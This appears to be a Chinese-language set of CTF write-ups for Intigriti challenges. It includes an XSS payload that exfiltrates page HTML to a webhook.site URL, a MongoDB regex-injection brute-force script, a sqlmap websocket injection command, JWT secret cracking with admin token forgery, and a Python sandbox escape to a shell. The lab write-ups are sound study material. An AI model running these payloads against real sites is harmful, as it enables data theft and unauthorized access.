script='<script>fetch("/")["then"]((data)=>data["text"]())["then"]((html)=>location=atob("aHR0cHM6Ly93ZWJob29rLnNpdGUvYjNhZThkNmEtMjkxMS00MGFkLWJmY2MtMDRhYmZmNTE2NmIxP2RhdGE9")+btoa(html))</script><p>sometag</pG'
result = based91.decode(script)
print(result.hex())

```

这里讲一下exp，

```javascript
fetch("/")
  ["then"]((data) => data["text"]())
  ["then"](
    (html) =>
      (location =
        atob("aHR0cHM6Ly93ZWJob29rLnNpdGUveW91ci1zZXJ2ZXI/ZGF0YT0=") +
        btoa(html))
  );
```

这段代码的作用是从根路径获取数据，然后将获取到的文本内容经过 Base64 编码后与一个预定义的 URL 进行拼接，最终将浏览器重定向到拼接后的 URL。即可在测试的网站中获取网页内容。

```html
<p>sometag</pG
```

这种是为了防止网页过滤一点，成功起到xss攻击的效果

学到了挺多的（另外对于字符的仔细观察也必不可少（被坑了好多:sob:））


wc真没想到啊，把那个转账的改成-10000就可以了

后段检验如此不严谨啊啊啊

一道好有意思的题

先登录然后审计源码

大概就是输入了三道题

```python
def createChalls():
	db.challs.insert_one({"_id": "28c8edde3d61a0411511d3b1866f0636","challenge_name": "Crack It","category": "hash","challenge_description": "My friend sent me this random string `cc4d73605e19217bf2269a08d22d8ae2` can you identify what it is? , flag format: CTFC{<password>}","challenge_flag": "CTFC{cryptocat}","points": "500","released": "True"})
	db.challs.insert_one({"_id": "665f644e43731ff9db3d341da5c827e1","challenge_name": "MeoW sixty IV","category": "crypto","challenge_description": "hello everyoneeeeeeeee Q1RGQ3tuMHdfZzBfNF90aDNfcjM0TF9mbDRHfQ==, oops sorry my cat ran into my keyboard, and typed these random characters","challenge_flag": "CTFC{n0w_g0_4_th3_r34L_fl4G}","points": "1000","released": "True"})
	db.challs.insert_one({"_id": "38026ed22fc1a91d92b5d2ef93540f20","challenge_name": "ImPAWSIBLE","category": "web","challenge_description": "well, this challenge is not fully created yet, but we have the flag for it","challenge_flag": os.environ['CHALL_FLAG'],"points": "1500","released": "False"})

```

这里的数据库为MongoDB

然后提交flag的审核逻辑如下

```python
def submit_flag():
	_id = request.json.get('_id')[-1]
	submitted_flag = request.json.get('challenge_flag')
	chall_details = db.challs.find_one(
			{
			"_id": md5(md5(str(_id).encode('utf-8')).hexdigest().encode('utf-8')).hexdigest(),
			"challenge_flag":submitted_flag
			}
	)
	if chall_details == None:
		return "wrong flag!"
	else:
		return "correct flag!"

```

这里是有Nosql注入漏洞的

可以模拟发包

```
POST /submit_flag HTTP/2
Host: ctfc.ctf.intigriti.io
Cookie: session=eyJ1c2VyIjp7Il9pZCI6IjBmYzJjYjgzMzJmYzQzM2RhNTI4ZjA5MjBiMjA2NDA5IiwidXNlcm5hbWUiOiJjeW55NjY2In19.ZXcNGg.1qEKcMju7oguVHClOb6oaBj8LmA
Content-Length: 50
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://ctfc.ctf.intigriti.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ctfc.ctf.intigriti.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=1, i

{"_id":"_id:1","challenge_flag":"CTFC{cryptocat}"}
```

然后这里可以借助MongoDB查找数据的特性来构造

构造python脚本

```python
import requests
import string

chars = string.ascii_letters + '_{}0123456789'
url = 'https://ctfc.ctf.intigriti.io/'
cookie = {
	"session": "eyJ1c2VyIjp7Il9pZCI6IjJiNWY0ZjI5MGE4NTQ4Mzk4ZmEyNDUwY2EwY2RlN2QzIiwidXNlcm5hbWUiOiJhYmMxMjMifX0.ZVeXSQ.Tf0yIJNzUdO7HXNsIp36vpyKcTw"
}
headers = {
	'content-type': 'application/json'
}
flag = "INTIGRITI{"

while True:
	for char in chars:
		print("trying: " + char)
		json_data = {
			"_id": "_id:3", 
			"challenge_flag": {
				"$regex": f"^{flag}{char}" 
			}
		}

		r = requests.post(url + 'submit_flag', headers = headers, cookies=cookie, json=json_data)
		
		if 'correct flag' in r.text:
			flag += char
			print(flag)
			break
	if '}' in flag:
		break
```

原本想到了这里可以爆破，但是没想到爆破的方式是如此的

打开txt文件然后发现这个

```
EUZEKJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERJFGJCSKMSEEUZEIJJSGASTERJFGJCSKMSFEUZEKJJSIUSTEMBFGJCSKMSFEUZEKJJSIUSTERJFGIYCKMSFEUZEKJJSIUSTERBFGJCCKMRQEUZEKJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERJFGJCSKMSFEUZEKJJSGASTERJFGJCSKMSFEUZEKJJSIUSTEMBFGJCSKMSFEUZEKJJSIUSTERJFGIYCKMSFEUZEKJJSIUSTERBFGJCCKMRQEUZEKJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERJFGJCSKMSFEUZEKJJSGASTERBFGJCSKMSFEUZEKJJSIUSTEMBFGJCSKMSFEUZEKJJSIUSTERBFGIYCKMSFEUZEKJJSIUSTERJFGJCSKMRQEUZEKJJSIUSTERJFGJCCKMSEEUZDAJJSIUSTERJFGJCSKMSFEUZEKJJSGASTERJFGJCSKMSFEUZEIJJSIQSTEMBFGJCSKMSFEUZEKJJSIUSTERJFGIYCKMSEEUZEKJJSIUSTERJFGJCSKMRQEUZEKJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERJFGJCCKMSEEUZEIJJSGASTERJFGJCSKMSFEUZEKJJSIQSTEMBFGJCSKMSEEUZDAJJSIQSTERJFGJCSKMSFEUZEKJJSGASTERJFGJCSKMSFEUZEKJJSIUSTEMBFGJCCKMSEEUZEKJJSIUSTERJFGIYCKMSFEUZEIJJSGASTERBFGJCSKMSFEUZEKJJSIUSTEMBFGJCSKMSFEUZEKJJSIUSTERBFGIYCKMSEEUZEKJJSIUSTERJFGJCSKMRQEUZEKJJSIUSTERBFGJCSKMRQEUZEKJJSIUSTERJFGJCSKMSEEUZDAJJSIUSTEMBFGJCSKMSFEUZEKJJSIUSTERBFGIYCKMSFEUZEKJJSIUSTERJFGJCCKMRQEUZEIJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERJFGJCSKMSFEUZEIJJSGASTERBFGJCSKMSFEUZEKJJSIUSTEMBFGJCCKMSFEUZEKJJSIUSTERJFGIYCKMSEEUZEKJJSIUSTERJFGJCSKMRQEUZEKJJSIUSTERJFGJCSKMSEEUZDAJJSIQSTERBFGJCSKMSFEUZEKJJSGASTERJFGJCCKMRQEUZEKJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERBFGJCCKMSEEUZEIJJSGASTERJFGJCSKMSFEUZEIJJSIQSTEMBFGJCSKMSEEUZEIJJSIQSTERBFGIYCKMSFEUZEKJJSIUSTERJFGJCSKMRQEUZEIJJSIQSTERBFGJCSKMSFEUZDAJJSIQSTERBFGJCSKMSFEUZEKJJSGASTERJFGJCCKMRQEUZEKJJSIUSTERJFGJCSKMSEEUZDAJJSIQSTERJFGJCSKMRQEUZEKJJSIUSTERJFGJCCKMSEEUZDAJJSIQSTERBFGJCCKMSEEUZEIJJSGASTERJFGJCSKMSFEUZEKJJSIQSTEMBFGJCSKMRQEUZEKJJSIUSTERJFGJCSKMSFEUZDAJJSIQSTERBFGJCCKMSFEUZEKJJSGASTERBFGJCSKMSFEUZEKJJSIUSTEMBFGJCCKMSFEUZEIJJSIUSTEMBFGJCCKMSFEUZEKJJSIUSTERJFGIYCKMSEEUZEKJJSIUSTERJFGJCSKMRQEUZEIJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERJFGJCSKMSEEUZEIJJSGASTERBFGJCSKMSFEUZEKJJSIUSTEMBFGJCSKMSEEUZDAJJSIUSTERJFGJCSKMSFEUZEIJJSGASTERJFGJCSKMSFEUZEKJJSIUSTEMBFGJCSKMSFEUZEKJJSIQSTERBFGIYCKMSFEUZEKJJSIQSTERBFGJCCKMRQEUZEIJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERBFGJCCKMSEEUZEIJJSGASTERJFGJCSKMSFEUZEKJJSIQSTEMBFGJCSKMSFEUZEKJJSIUSTERBFGIYCKMSEEUZEKJJSIUSTERJFGJCSKMRQEUZEKJJSIUSTERJFGJCCKMSEEUZDAJJSIUSTERJFGJCCKMSEEUZEIJJSGASTERJFGJCSKMSEEUZEKJJSGASTERBFGJCSKMSFEUZEKJJSIUSTEMBFGJCCKMSFEUZEKJJSIUSTERJFGIYCKMSFEUZEKJJSIUSTERJFGJCSKMRQEUZEKJJSIQSTERBFGJCCKMSEEUZDAJJSIUSTERJFGJCSKMSEEUZEIJJSGASTERBFGJCSKMSFEUZDAJJSIUSTERJFGJCSKMSEEUZEIJJSGASTERBFGJCSKMSF
```

然后开始想这是哪一种古典密码、然后想不出来就去看wp（不得不说自己很喜欢看wp、太菜了呜呜呜）

现在后话来看。这么长后面要缩的就可以先

base32 - url - morse - hex就可以获得flag了（下次多做会）别那么容易看答案



一直解压然后在文件的原始数据中提取即可，记好前缀为INTIGRITI{

---
title: Intigriti CTFBug Report Repo 
date: 2023-12-21 15:52:25
categories:
  - WriteUp
tags:
  - Web

---

挺难的一道题，也挺有意思的一道题，发篇博客复现一下，主要考察webscoket注入+JWT伪造

先打开一下环境

![image-20231223192353902](./../../../../AppData/Roaming/Typora/typora-user-images/image-20231223192353902.png)

然后发现是一个基于websocket实时通讯的一个bug report平台，这里输入一个ID，然后服务器即可返回将这个高亮

需要注意的是ID=11的时候有一个好玩的显示，感觉这里的ethical_hacker是提示

![image-20231223192518962](./../../../../AppData/Roaming/Typora/typora-user-images/image-20231223192518962.png)

然后可以用bp抓包其实感觉websocket的抓包和普通的sql注入是差不多的？

这里又做了下载bp的破解版+给chrome导入bp的证书，突然发现bp是可以截取webscoket信息的，比在js上调试好多了，不知道为什么bp截取https总会很慢 不知道是网站问题还是我bp的问题（略微倾向一点网站的问题）真的好奇怪 就我改成系统代理立马就好了，但是用bp的代理就会卡很久、但是最后还是好了，不懂

![](https://notes.sjtu.edu.cn/uploads/upload_f00a80c2e3daf61aa87ba75f2e349208.png)

然后可以用sqlmap进行注入分析，sqlmap真是神

```shell
sqlmap --random-agent -u 'wss://bountyrepo.ctf.intigriti.io/ws' --data '{"id":"11"}' --dbms sqlite -T "bug_reports" --threads 10 --dump --where "id=11" --batch
```

这些参数的介绍

* -random-agent：指随机agent
* -u:后面加URL，这里是指webscoket的服务器端
* -data：`sqlmap` 中的 `-d` 或 `--data` 参数用于指定要用于 POST 请求的数据。在 Web 应用程序渗透测试中，你可能会遇到需要检测和利用 POST 请求中的 SQL 注入漏洞的情况。使用 `-d` 参数，你可以向 `sqlmap` 提供 POST 请求的数据，以便它能够分析和测试可能存在的 SQL 注入漏洞。
* -dbms:指数据库
* -T: 应该是table
* --threads:指多线程
* --dump：指将数据展示出来

然后即可注出漏洞！感觉脚本小子真好

![](https://notes.sjtu.edu.cn/uploads/upload_6a9278bb593bfc9351ebaff070dd6d57.png)

发现这个：crypt0:c4tz on /4dm1n_z0n3, really?!

然后登录

https://bountyrepo.ctf.intigriti.io/4dm1n_z0n3/

输入账号和密码

![](https://notes.sjtu.edu.cn/uploads/upload_015f2fce5d92d4eba06e93f96c839dca.png)

然后发现不是admin，然后查看cookie发现是jwt

![image-20231223194310779](./../../../../AppData/Roaming/Typora/typora-user-images/image-20231223194310779.png)

然后用jwt tools爆破获取密钥

这里加个插曲，平时一个人用root跟普通用户习惯了，忘记普通用户的python环境和root不一样了

![](https://notes.sjtu.edu.cn/uploads/upload_9dc8139afb9a358b68ff1f38b8707ec8.png)

爆破出来密钥为catsarethebest，然后伪造admin

![image-20231223194518709](./../../../../AppData/Roaming/Typora/typora-user-images/image-20231223194518709.png)

修改cookie即可获得flag



先对流量包进行分析，发现是用ftp上传了一个flag.zip文件

然后开始找有效信息发现

![image-20231210230943131](./assets/image-20231210230943131.png)

这里上传了flag.zip

下面是数据包

![image-20231210231011594](./assets/image-20231210231011594.png)

这里要提一嘴，文件实体通常以标识`50 4B 03 04`开头，这往往也是我们判别文件是否为压缩包的重要标准

然后把这段数据复制出来然后保存为zip文件

然后发现打开需要密码

![image-20231210231156310](./assets/image-20231210231156310.png)

这是原本密码

然后将2022改成2023即可解压缩获得flag



啊啊啊流量分析好难

先打开大致扫一下发现从ftp改为了smtp？可能会安全一点吗

搜索imf发现一下四条

![image-20231211155209789](./assets/image-20231211155209789.png)

第一个的文本内容为

```
'
Hi CryptoCat,

It's been a long time since we last saw each other, and I've been thinking about our friendship. I believe it's important for us to stay connected and share important things in a way that only you and I can understand.

I wanted to remind you that we need to pay more attention to our communications, especially when it comes to discussing crucial matters. Sometimes, we might need to hide our messages in plain sight, using our own secret language. As you know SMTP isn't secure as you think!

It's like we're on a treasure hunt, and the treasure is our bond. You know the drill - for our important stuff, we'll need to hide it somewhere unique, somewhere only we can find it.

Looking forward to hearing from you soon. Let's make our conversations more interesting and secure.

Best,
0xM4hm0ud
```

第二个为

```
Hey 0xM4hm0ud,

It's great to hear from you! I completely agree that we should keep our conversations private and intriguing. Our special bond deserves nothing less. I'm up for the challenge!

I've been thinking about a unique way we can communicate securely. 
Maybe we could use a combination of our favorite books, movies or pets as a code, or even a simple cipher? Let's brainstorm ideas and keep our messages hidden from prying eyes.

Looking forward to rekindling our friendship in this exciting and mysterious way.

Talk to you soon,
CryptoCat
```

后面发现是两个base64解码后的文件数据(cyberchef是神)

追踪流中复制数据然后先base64解码再render image

![image-20231211155925143](./assets/image-20231211155925143.png)



再用lsb隐写即可获得flag

![image-20231211160153887](./assets/image-20231211160153887.png)

感觉这题简单的让我懵逼，没想到是这个东西，原本一直在绕

还写了一点hint.txt

```
大概可以绕过的思路
print
构造数字 len(repr(True))
目测的payload
构造os o=111=4*4*4+4*4*2+4*4*1-1 s=115
这里构造的为字符串
exec(ls)

print((chr(len(repr(True))*len(repr(True))*(len(repr(True))+True+True+True)-True)+chr(len(repr(True))*len(repr(True))*(len(repr(True))+True+True+True)-True+len(repr(True))))[::-True])
```

最后发现可以用breakpoint()

pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。

在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码

然后即可执行import os;os.system("$(which sh)"即可拿到shell权限即可获取flag

![learnhttp](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAuMAAAKSCAYAAAB4A9XAAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAANJhSURBVHhe7N0HgNTUFgbgsyy99w5K771Ib9J7772o+EAQRAUFFZCmVKWD0qV3RASUDoKiIIiIgID03llg4d3/JtnNZMrOwuJY/s83j0kmm0m5Sc69ObkTdP7cocdCRERERER/uWjmv0RERERE9BdjME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAGIwTEREREQUIg3EiIiIiogBhME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAGIwTEREREQUIg3EiIiIiogBhME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAGIwTEREREQUIg3EiIiIiogBhME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAGIwTEREREQUIg3EiIiIiogBhME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAGIwTEREREQUIg3EiIiIiogBhME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAGIwTEREREQUIg3EiIiIiogBhME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAGIwTEREREQUIg3EiIiIiogBhME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAGIwTEREREQUIg3EiIiIiogBhME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAGIwTEREREQUIg3EiIiIiogBhME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAGIwTEREREQUIg3EiIiIiogBhME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAGIwTEREREQUIg3EiIiIiogBhME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAGIwTEREREQUIg3EiIiIiogBhME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAGIwTEREREQUIg3EiIiIiogBhME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAGIwTEREREQUIg3EiIiIiogBhME5EREREFCAMxomIiIiIAoTBOBERERFRgDAYJyIiIiIKEAbjREREREQBwmCciIiIiChAgs6fO/TYfE+RlGJjDQl6eNscErmZu5fczVDfHAqMGFf2ScyrP5hDIo+iJ5S7zzU2h7xLvqWZRLt71hwSuZ21s9zO0tYcerbct2NvtR3rmUP0pIJC70qKDdXMIZHQeJnkcpmZ5hDJ44eS8usX8cYYVq7nf09C0mCcb7HPrJOEP39oDhkuVNui/417YpHE//UT/f5p3creVe5kaqHfO4+TJxYcRy5UXqffxjsyVeIdm63fRyhaTHkYN73cT15U7qavq8pTRvMDIvrLPXogKddXVm/Cz1+BjkES7XtfYp37xhwSCUlZRq4XGmIOkS9sGf+XiXl1n8T7fUbYK+6JJeYnRERP4dF9iX7rmMT9Y6Ek295enV+mmx8QEdHTYDBORESR8/ihxDs6U+IdmWaOICKiJ8VgnIiInki843N1azkRET055ow/hb9jzni8o7Mk3u/hrVWhcdLJ5XJfmEPexT7ztQSF3lH/rpcY136WW9lekjuZW5ufPlv/6pzxx6Hq/4LU//76ei9zxiPwjHLGUZaDHtzQ752i3z4liX94wxwyXCsyQh7Ge84ccvU4RkJ5HD2efh/t7jmM0e+dEh4aLTEv7jKHRO4nKyo38vQxhyyqHJoexUmt/3XmjIfGTS9XiyPfPXxaDSkqt0+o4PsLiXFlrznSgGMVx2yUUPtEgoLVG8f3E/3XOY8N5oz/qzAYfwpRHYwjeIp9+kuJdWG7RL95TKLhgh4thgqoU8qDxHnlbrqa6t985tThIvvAWGhcFaCX9RygJ/rpPYl1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